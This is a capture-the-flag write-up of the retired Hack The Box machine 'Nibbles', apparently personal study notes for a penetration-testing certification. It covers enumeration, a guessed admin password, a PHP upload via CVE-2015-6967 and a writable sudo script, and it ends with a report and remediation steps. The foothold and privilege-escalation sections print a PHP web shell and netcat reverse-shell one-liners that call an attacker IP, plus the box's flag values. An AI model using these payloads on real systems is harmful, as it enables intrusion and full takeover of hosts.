@@ -1,0 +1,319 @@
+---
+title: "Nibbles"
+---
+
+<Info>
+**Box metadata**
+
+- **Platform:** HTB — Retired (Tier 2 Easy)
+- **OS:** Linux
+- **Difficulty:** Easy
+- **Status:** Retired
+- **Released:** 2018-01-13
+- **Started:** 2026-04-22 
+- **User flag:** 
+- **Root flag:** 
+- **Total time:** 15:30
+- **Walkthrough used?** Yes
+- **Tags:** #linux #web #cms #nibbleblog #file-upload #sudo-misconfig
+</Info>
+
+---
+
+## 🗺 One-line summary
+
+HTTP enum → `/nibbleblog/` CMS (v4.0.3, CVE-2015-6967) → admin creds guessed from site context → authenticated PHP upload via My Image plugin → reverse shell as `nibbler` → writable `monitor.sh` with sudo NOPASSWD → root.
+
+---
+
+## 🔍 Enumeration
+
+### Nmap
+
+```bash
+nmap -sC -sV -oA nmap/initial 10.129.96.84
+```
+
+Findings:
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+### Service-by-service
+
+- **Port 22 / SSH:** OpenSSH 7.2p2 Ubuntu 4ubuntu2.2. No obvious exposure — defer unless we recover a credential.
+- **Port 80 / HTTP:** Apache httpd 2.4.18. Primary attack surface.
+
+### Web enumeration
+
+The root page returned "Hello world" but a comment in the HTML source leaked a hidden path:
+
+```bash
+curl http://10.129.96.84/
+# <!-- /nibbleblog/ directory. Nothing interesting here! -->
+```
+
+Opening `/nibbleblog/` in Firefox renders a blog; the footer says "Powered by Nibbleblog". `whatweb` confirmed the CMS, and a quick search for "nibbleblog exploit" showed that **Nibbleblog 4.0.3** is vulnerable to **CVE-2015-6967** (authenticated arbitrary file upload via the My Image plugin):
+
+```bash
+whatweb http://10.129.96.84/nibbleblog/
+```
+
+Directory brute-force against `/nibbleblog/`:
+
+```bash
+gobuster dir -u http://10.129.96.84/nibbleblog/ \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50
+```
+
+Results:
+
+```
+/README      (Status: 200) [Size: 4628]
+/admin       (Status: 301) [--> /nibbleblog/admin/]
+/admin.php   (Status: 200) [Size: 1401]
+/.htpasswd   (Status: 403) [Size: 307]
+/content     (Status: 301) [--> /nibbleblog/content/]
+/.htaccess   (Status: 403) [Size: 307]
+/.hta        (Status: 403) [Size: 302]
+/index.php   (Status: 200) [Size: 2987]
+/languages   (Status: 301) [--> /nibbleblog/languages/]
+/plugins     (Status: 301) [--> /nibbleblog/plugins/]
+/themes      (Status: 301) [--> /nibbleblog/themes/]
+```
+
+Status code reminder: **200** = resource served; **301** = directory redirect (directory listing is enabled); **403** = exists but forbidden. `/README` confirmed the exact CMS version: **Nibbleblog 4.0.3** (vulnerable).
+
+**Interesting findings:**
+
+- HTML comment in `/` points to the `/nibbleblog/` directory.
+- CMS identified as Nibbleblog 4.0.3 → vulnerable to CVE-2015-6967.
+- `/nibbleblog/admin.php` login page exposed.
+- Directory listing enabled across subdirectories (see 301 redirects).
+- `/nibbleblog/content/private/` browseable → `users.xml` leaks the admin username and an IP blacklist (brute force will auto-ban).
+- `config.xml` leaks the admin email `admin@nibbles.com`.
+- File-upload sink identified in the admin panel → Plugins → **My Image**.
+
+---
+
+## 🚪 Initial foothold
+
+### Vulnerability
+
+**Nibbleblog 4.0.3 — CVE-2015-6967 — authenticated arbitrary file upload via the "My Image" plugin.**
+
+### Exploitation steps
+
+1. **Recovered the admin username from leaked config.** Browsing `/nibbleblog/content/private/` exposed `users.xml`, which listed the user `admin` and a populated IP blacklist — confirming brute force would trigger an auto-ban, so credential *guessing* was the right path. `config.xml` in the same directory exposed `admin@nibbles.com`.
+
+2. **Guessed the admin password.** Common weak combos (`admin:admin`, `admin:password`) triggered the "Nibbleblog security error — Blacklist protection" message. Tried `admin:nibbles` based on the site name — accepted.
+
+3. **Uploaded a test PHP payload via the My Image plugin.** First, `shell.php`:
+
+    ```php
+    <?php system('id'); ?>
+    ```
+
+    Uploading through Plugins → My Image produced warnings but also a "changes saved successfully" message. The file landed at a predictable path — requesting it via curl confirmed execution:
+
+    ```bash
+    curl http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php
+    ```
+
+4. **Replaced the test payload with a reverse shell.** Using attacker tun0 IP `10.10.14.174` and port `9443`:
+
+    ```php
+    <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 9443 >/tmp/f'); ?>
+    ```
+
+    Listener on attacker:
+
+    ```bash
+    nc -lvnp 9443
+    ```
+
+    Re-uploaded through My Image, then requested `image.php` in the browser — caught the shell.
+
+5. **Stabilized the shell** (the raw shell is too limited to work in):
+
+    ```bash
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+    ```
+
+**User:** `nibbler`
+**user.txt:** `67f2d04b4a10da7deeaaab8ed4dfe5d9` ✅
+
+---
+
+## 📈 Privilege escalation
+
+### Enumeration (post-foothold)
+
+Tried `sudo su -` out of habit — asked for a password I didn't have. Listed the home directory instead (`ls -la /home/nibbler`) and found `personal.zip` and `user.txt`.
+
+`sudo -l` immediately revealed the privesc path:
+
+```bash
+sudo -l
+# User nibbler may run the following commands on Nibbles:
+#     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+Cross-checked with `linpeas.sh`. The target couldn't reach the internet directly, so staged linpeas over an ad-hoc HTTP server:
+
+```bash
+# Attacker
+python3 -m http.server 8080
+
+# Target
+wget http://10.10.14.174:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+linpeas confirmed the same sudo misconfiguration.
+
+### Privesc vector
+
+`nibbler` can execute `/home/nibbler/personal/stuff/monitor.sh` as `root` without a password **and** `nibbler` has write access to that script. Classic writable-sudo-script escalation.
+
+### Exploitation steps
+
+1. **Confirmed the sudo entry** with `sudo -l`; cross-checked with linpeas.
+
+2. **Extracted `monitor.sh`.** The script lived inside `personal.zip` in `/home/nibbler` — unzipped it:
+
+    ```bash
+    cd /home/nibbler
+    unzip personal.zip
+    ls -la personal/stuff/monitor.sh   # confirmed writable by nibbler
+    ```
+
+3. **Appended a reverse-shell payload to `monitor.sh`** (append, don't overwrite, so the script still functions normally):
+
+    ```bash
+    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 8443 >/tmp/f' \
+      | tee -a /home/nibbler/personal/stuff/monitor.sh
+    ```
+
+4. **Started a second listener on the attacker:**
+
+    ```bash
+    nc -lvnp 8443
+    ```
+
+5. **Triggered the script as root via sudo:**
+
+    ```bash
+    sudo /home/nibbler/personal/stuff/monitor.sh
+    ```
+
+<Warning>
+**Path gotcha**
+
+You **must** invoke the script with the exact absolute path shown in `sudo -l`. `cd`-ing into `personal/stuff/` and running `sudo ./monitor.sh` or `sudo monitor.sh` will fail — the sudoers rule matches the command string literally.
+</Warning>
+
+**root.txt:** `f79b3dbf1bdf97114ecd6da27255a9c0` ✅
+
+```bash
+cd /root
+cat root.txt
+```
+
+---
+
+## 🎓 Lessons learned
+
+<Tip>
+**What I didn't know before this box**
+
+- Always read the HTML source of the landing page — the juiciest hints hide in comments.
+- When brute force is blacklisted, pivot to credential *guessing* using site-specific context (company name, email local-part, README files, default docs).
+- For a writable-sudo-script privesc, **append** (`tee -a` or `echo >>`) rather than overwrite, so the original script still works and nothing looks broken.
+- The sudoers command string matches literally — always invoke with the absolute path shown in `sudo -l`.
+- `sudo -l` is always step 1 post-foothold.
+</Tip>
+
+<Warning>
+**What cost me time**
+
+- Overanalyzing potential command-injection sinks in the admin panel (Publish, Categories, Hello World plugin) before checking the known CVE path (My Image file upload).
+- Forgetting `tee -a` needs a space between the flag and the filename — typo'd it as `tee-amonitor.sh` the first time and it silently failed.
+- Didn't immediately notice `personal.zip` needed extracting before I could edit `monitor.sh`.
+</Warning>
+
+---
+
+## 🧰 Tools used
+
+- [x] nmap
+- [x] gobuster
+- [ ] BurpSuite
+- [x] curl / wget (enumeration + file staging)
+- [x] netcat (reverse shell listener + payload)
+- [x] whatweb
+- [x] linpeas
+- [x] python3 (`pty` upgrade + `http.server` file staging)
+- [ ] Metasploit (deliberately avoided — manual for CPTS prep)
+
+---
+
+## 🔗 Linked modules
+
+- **Modules/Footprinting**
+- **Modules/File_Transfers**
+- **Modules/Attacking_Common_Applications**
+- **Modules/Linux_Privilege_Escalation**
+
+---
+
+## 📝 Mini report (practice for CPTS exam)
+
+<Note>
+**Treat every box like an exam question.**
+
+The drafts below are a starting point — **rewrite in your own words** so the concepts actually stick. The CPTS exam is a written report; this is the exercise that matters most.
+</Note>
+
+### Executive summary (non-technical)
+
+A security assessment of the host identified two chained weaknesses that together allowed complete takeover of the system within approximately 15 minutes of engagement start. The public-facing blog application was running an outdated version of Nibbleblog (4.0.3, released 2014) that contains a publicly documented vulnerability allowing an authenticated administrator to upload arbitrary files. The administrator account was protected by a weak, easily guessable password derived from the site name. Once the blogging platform was compromised, a separate misconfiguration on the underlying server — a maintenance script that a low-privileged user could both execute as root and modify — was abused to obtain full administrative control of the host.
+
+The business impact is high: an attacker with no prior access could deface the company website, steal any data stored on the host, use the server as a pivot into the internal network, and install persistent backdoors. Because the weaknesses are documented publicly and exploited using freely available tools, the likelihood of exploitation is also high. Immediate remediation consists of upgrading the blog software, rotating all administrative credentials to strong unique values, and restricting the dangerous sudo permission.
+
+### Technical walkthrough
+
+Initial reconnaissance with `nmap -sC -sV` identified two services on the target: OpenSSH 7.2p2 on TCP/22 and Apache httpd 2.4.18 on TCP/80. The web root served a minimal "Hello world" page, but an HTML comment in the source referenced a `/nibbleblog/` subdirectory. `whatweb` confirmed Nibbleblog as the CMS, and directory enumeration with `gobuster` against `/nibbleblog/` exposed `/README` (disclosing version 4.0.3), `/admin.php`, and `/content/`. Nibbleblog 4.0.3 is vulnerable to **CVE-2015-6967**, an authenticated arbitrary file upload in the "My Image" plugin.
+
+The admin username `admin` was recovered from `/nibbleblog/content/private/users.xml`, exposed by directory listing. Brute-force authentication was mitigated by an IP-blacklist defense, so the password was instead guessed as `nibbles` (the site name) and accepted on the first attempt. From the admin panel, the My Image plugin accepted a PHP file (`image.php`) containing a netcat-based reverse shell, which was triggered by requesting `/nibbleblog/content/private/plugins/my_image/image.php` while listening with `nc -lvnp 9443`. The returned shell was upgraded with `python3 -c 'import pty; pty.spawn("/bin/bash")'` and ran as user `nibbler`, yielding `user.txt`.
+
+Post-exploitation enumeration with `sudo -l` (cross-checked by `linpeas.sh`, staged over an ad-hoc `python3 -m http.server 8080`) revealed `nibbler` could run `/home/nibbler/personal/stuff/monitor.sh` as root without a password. After unzipping `personal.zip`, the script was found to be writable by `nibbler`. A reverse-shell payload was appended with `tee -a monitor.sh`, a second listener opened on TCP/8443, and `sudo /home/nibbler/personal/stuff/monitor.sh` was executed — granting a root shell and `root.txt`.
+
+### Remediation recommendations
+
+1. **Upgrade Nibbleblog to the latest supported release**, or migrate to a maintained CMS. CVE-2015-6967 is over a decade old; running this version in production is unacceptable.
+2. **Rotate the admin credential to a strong, unique passphrase** and enforce a password policy that forbids values derived from the site or company name.
+3. **Disable directory listing** (Apache `Options -Indexes`) and restrict access to `content/private/` at the web-server level. `users.xml` and `config.xml` must never be world-readable.
+4. **Remove the `NOPASSWD` sudoers entry for `monitor.sh`**, or, if the script must run as root, move it outside `nibbler`'s home, set ownership `root:root` with mode `0755`, and reference the new absolute path in sudoers.
+5. **Deploy a WAF or fail2ban** in front of the blog admin login to replace the brittle application-layer IP blacklist.
+
+---
+
+## ✅ Self-review checklist
+
+- [ ] I solved the box without a walkthrough (or noted exactly where I got stuck)
+- [ ] I wrote the mini report above in my own words
+- [ ] I re-did the box a week later in &lt;50% of the original time
+- [ ] I linked every module this box used
+- [ ] I added any new commands to `Common commands.md`
